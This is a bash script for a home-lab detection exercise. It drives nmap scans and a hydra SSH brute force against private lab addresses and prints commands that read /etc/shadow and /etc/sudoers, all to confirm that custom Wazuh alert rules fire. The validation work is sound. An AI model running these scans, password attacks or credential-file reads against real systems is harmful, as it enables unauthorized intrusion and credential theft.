#!/usr/bin/env bash
# Phase 3 live-fire attack runner -- run ON the attacker VM (zeno, 192.168.1.106).
#
# Drives the live attack chain against the lab and prints UTC timestamp markers so
# each burst can be matched to its Wazuh dashboard alert. Proves the Phase 4 custom
# rules (100015-100020) fire end-to-end: agent/sensor -> manager -> indexer -> dashboard.
#
# Coverage:
#   ATTACK A  scan        -> rules 100015 (loud, Level 12), 100016 (burst)   MITRE T1046/T1595
#   ATTACK B  brute force -> rules 100017 (Level 12), 100018 (compromise)    MITRE T1110
#   ATTACK C  file access -> rule  100019                                    MITRE T1003/T1552
#             ^ runs on the AGENT box, not here -- see footer.
#
# This script runs A + B. C is a two-liner on the endpoint (printed at the end).
set -u

# ---------------- knobs (override via env, e.g. TARGET=192.168.1.108 ./attack_runner.sh) ----------------
TARGET="${TARGET:-192.168.1.104}"          # scan + brute-force target (Pi sensor by default)
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
BRUTE_USER="${BRUTE_USER:-testuser}"       # all-invalid user for the detection burst (100017)
VICTIM_USER="${VICTIM_USER:-labvictim}"    # throwaway account that EXISTS on TARGET (for 100018)
HYDRA_TASKS="${HYDRA_TASKS:-4}"            # parallel SSH tries -- keep low, realistic
BURST="${BURST:-30}"                       # number of failed attempts in the detection burst

mark(){ echo; echo "================ $(date -u +%H:%M:%SZ)  $* ================"; echo; }

mark "PRE-FLIGHT -- confirm weapons + target"
which nmap hydra >/dev/null || { echo "FAIL: nmap/hydra not installed"; exit 1; }
echo "target = $TARGET"
ping -c1 -W2 "$TARGET" >/dev/null && echo "target reachable" || echo "WARN: target did not answer ping (may still be up)"

# ----------------------------- ATTACK A : scan -----------------------------
mark "ATTACK A1 -- loud scan: nmap -sV -A   [expect 100015 + ET SCAN on the Pi]"
sudo nmap -sV -A "$TARGET"

mark "ATTACK A2 -- stealth gap test: nmap -sS -T1   [does 100016 fire? does ANYTHING?]"
sudo nmap -sS -T1 --top-ports 100 "$TARGET"
echo "NOTE: a confirmed MISS on -sS -T1 is a valid headline finding -- record it honestly."

# ----------------------------- ATTACK B : brute force -----------------------------
if [ ! -r "$WORDLIST" ]; then
  echo "WARN: $WORDLIST not found -- making a tiny throwaway burst list instead"
  printf 'pw%02d\n' $(seq 1 "$BURST") > /tmp/burst.txt
else
  head -n "$BURST" "$WORDLIST" > /tmp/burst.txt
fi

mark "ATTACK B1 -- brute force, all-invalid user '$BRUTE_USER'  [expect 100017 after 6 fails/120s]"
hydra -l "$BRUTE_USER" -P /tmp/burst.txt "ssh://$TARGET" -t "$HYDRA_TASKS" -V
echo "B1 done -- $(wc -l < /tmp/burst.txt) attempts sent."

mark "ATTACK B2 -- compromise path (success AFTER the burst)  [expect 100018, Level 14]"
echo "Needs throwaway account '$VICTIM_USER' to EXIST on $TARGET with a known weak password."
echo "Prereq on TARGET:  sudo useradd -m $VICTIM_USER && echo '$VICTIM_USER:L4bWeak!23' | sudo chpasswd"
echo "Then run, from here:"
echo "  printf 'x1\\nx2\\nx3\\nx4\\nx5\\nL4bWeak!23\\n' > /tmp/compromise.txt"
echo "  hydra -l $VICTIM_USER -P /tmp/compromise.txt ssh://$TARGET -t 4 -V"
echo "(left manual -- only run once the account exists; cleanup: sudo userdel -r $VICTIM_USER on TARGET)"

# ----------------------------- confirm -----------------------------
mark "DONE -- A + B sent. Confirm on the dashboard (https://192.168.1.50, Last 15 min):"
cat <<'EOF'
  Threat Hunting filters:
    rule.id:(100015 OR 100016)        -> ATTACK A  (scan)
    rule.id:(100017 OR 100018)        -> ATTACK B  (brute force / compromise)
  Screenshot each delta -> portfolio/screenshots/phase4/
  Fill the [RUN] blanks in:
    incidents/phase3_stealth_scan_gap_report.md   (A)
    incidents/phase3_ssh_bruteforce_report.md      (B)

  ATTACK C (rule 100019) -- run on the AGENT that has the auditd -k identity watch (Ultran/zbook):
    sudo cat /etc/shadow  >/dev/null
    sudo cat /etc/sudoers >/dev/null
  Confirm: rule.id:100019  (Level 12)
EOF
